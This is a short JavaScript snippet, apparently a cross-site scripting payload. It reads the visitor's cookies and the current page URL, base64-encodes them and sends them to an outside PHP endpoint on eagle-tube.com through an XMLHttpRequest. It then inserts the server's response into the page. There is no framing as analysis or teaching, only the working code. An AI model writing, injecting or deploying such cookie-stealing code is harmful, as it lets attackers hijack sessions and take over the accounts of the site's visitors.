var cookie = document.cookie;
var current = window.location.href;
let allx = btoa(cookie+" |eagle| "+current);

var xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       // Typical action to be performed when the document is ready:
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET","https://www.eagle-tube.com/raw/images/dfs.php?x="+allx, true);
xhttp.send();
